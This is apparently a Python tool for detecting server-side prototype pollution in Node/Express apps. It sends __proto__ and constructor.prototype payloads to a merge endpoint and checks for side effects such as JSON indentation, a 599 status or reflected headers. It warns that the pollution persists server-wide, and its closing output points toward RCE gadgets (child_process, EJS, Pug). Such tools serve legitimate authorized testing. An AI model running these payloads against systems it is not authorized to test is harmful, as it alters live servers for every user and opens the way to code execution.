#!/usr/bin/env python3
"""
pp_probe.py - server-side prototype pollution (SSPP) detector via benign side-effect oracles (authorized only).

Server-side pollution is blind, so this confirms it by polluting a framework OPTION that changes an observable response,
then re-reading a JSON endpoint and diffing against a baseline. Oracles (Gareth Heyes / PortSwigger technique):
  * json-spaces    {"__proto__":{"json spaces":10}}          -> later JSON responses become indented   (BEST, benign)
  * status         {"__proto__":{"status":599}}              -> later response status changes
  * exposed-headers{"__proto__":{"exposedHeaders":["x8pp"]}} -> Access-Control-Expose-Headers reflects
  * charset        {"__proto__":{"content-type":"...;charset=x8pp"}} -> Content-Type reflects

It POSTs the pollution to a source endpoint, then GETs an observe endpoint and compares. Control-baselined: a change only
counts against a clean baseline.

!! CAUTION: real server-side pollution is PROCESS-GLOBAL and PERSISTS UNTIL THE APP RESTARTS. This tool uses only benign
markers (json spaces / a nonce header), but even those affect every user until restart. Default is json-spaces only (the
safest). Use --all only where you're authorized and understand the persistence. Never run app-breaking oracles on prod.

Usage:
  python3 pp_probe.py --source https://t/api/settings --observe https://t/api/data
  python3 pp_probe.py --source https://t/api/settings --observe https://t/api/data --oracle status
  python3 pp_probe.py --source https://t/api/settings --observe https://t/api/data --all
"""
import argparse, json, sys, urllib.request, urllib.error


def http(url, method="GET", body=None, headers=None, timeout=15):
    data = json.dumps(body).encode() if body is not None else None
    h = {"Content-Type": "application/json"} if body is not None else {}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read().decode("utf-8", "replace") if hasattr(e, "read") else "")
    except Exception as e:
        return None, {}, f"__ERR__ {type(e).__name__}: {e}"


def indent_score(body):
    return sum(1 for line in body.split("\n") if line[:1] in (" ", "\t"))


ORACLES = {
    "json-spaces": {"$payload": {"json spaces": 10},
                    "desc": "Express JSON indentation (benign, best)"},
    "status": {"$payload": {"status": 599}, "desc": "response status override"},
    "exposed-headers": {"$payload": {"exposedHeaders": ["x8pp_marker"]}, "desc": "CORS Access-Control-Expose-Headers"},
    "charset": {"$payload": {"content-type": "application/json; charset=x8pp_marker"}, "desc": "Content-Type charset"},
}


def check(name, base, after):
    bstat, bhdr, bbody = base
    astat, ahdr, abody = after
    if abody.startswith("__ERR__") or bbody.startswith("__ERR__"):
        return False, "request error"
    if name == "json-spaces":
        bi, ai = indent_score(bbody), indent_score(abody)
        if ("\n" in abody and "\n" not in bbody) or ai > bi + 1:
            return True, f"indentation appeared (indent lines {bi} -> {ai})"
        return False, f"no indentation change (indent lines {bi} -> {ai})"
    if name == "status":
        if astat == 599 and bstat != 599:
            return True, f"status {bstat} -> {astat}"
        return False, f"status unchanged ({bstat} -> {astat})"
    if name == "exposed-headers":
        v = ahdr.get("Access-Control-Expose-Headers", "")
        if "x8pp_marker" in v:
            return True, f"Access-Control-Expose-Headers reflects marker: {v}"
        return False, "marker not reflected in CORS expose-headers"
    if name == "charset":
        v = ahdr.get("Content-Type", "")
        if "x8pp_marker" in v:
            return True, f"Content-Type reflects marker: {v}"
        return False, "marker not reflected in Content-Type"
    return False, "unknown oracle"


def main():
    ap = argparse.ArgumentParser(description="Server-side prototype pollution (SSPP) oracle detector (authorized only).")
    ap.add_argument("--source", required=True, help="endpoint that MERGES the JSON body (the pollution source)")
    ap.add_argument("--observe", required=True, help="JSON endpoint to read for the side effect (may equal --source)")
    ap.add_argument("--source-method", default="POST")
    ap.add_argument("--oracle", choices=list(ORACLES), default="json-spaces", help="which oracle (default json-spaces)")
    ap.add_argument("--all", action="store_true", help="try every oracle (WARNING: compounds persistent pollution)")
    ap.add_argument("--root", choices=["__proto__", "constructor"], default="__proto__",
                    help="pollution root; 'constructor' uses constructor.prototype (filter bypass)")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value' (repeatable)")
    ap.add_argument("--timeout", type=float, default=15.0)
    a = ap.parse_args()
    hdrs = dict(hh.split(":", 1) for hh in a.header) if a.header else {}

    def wrap(inner):
        return {"__proto__": inner} if a.root == "__proto__" else {"constructor": {"prototype": inner}}

    print("!! SSPP pollution is process-global and persists until the app RESTARTS. Benign markers only; not on fragile prod.\n")
    base = http(a.observe, headers=hdrs, timeout=a.timeout)
    print(f"[i] baseline observe: status={base[0]} indent_lines={indent_score(base[2])} "
          f"ct='{base[1].get('Content-Type','')}'\n")

    names = list(ORACLES) if a.all else [a.oracle]
    hits = 0
    for name in names:
        payload = wrap(ORACLES[name]["$payload"])
        ps, ph, pb = http(a.source, method=a.source_method, body=payload, headers=hdrs, timeout=a.timeout)
        after = http(a.observe, headers=hdrs, timeout=a.timeout)
        ok, why = check(name, base, after)
        tag = "SSPP CONFIRMED" if ok else "no"
        print(f"  [{tag}] oracle={name:15} ({ORACLES[name]['desc']})")
        print(f"      pollute -> {json.dumps(payload)}  (source status {ps})")
        print(f"      {why}")
        if ok:
            hits += 1
    print(f"\n[i] {hits}/{len(names)} oracle(s) fired. "
          + ("SSPP confirmed -> match a gadget (child_process/EJS/Pug) from the target's deps for RCE. "
             "Note: prototype stays polluted until restart." if hits else
             "No SSPP via these oracles (try --all, --root constructor, or another source endpoint)."))
    return 0


if __name__ == "__main__":
    sys.exit(main())
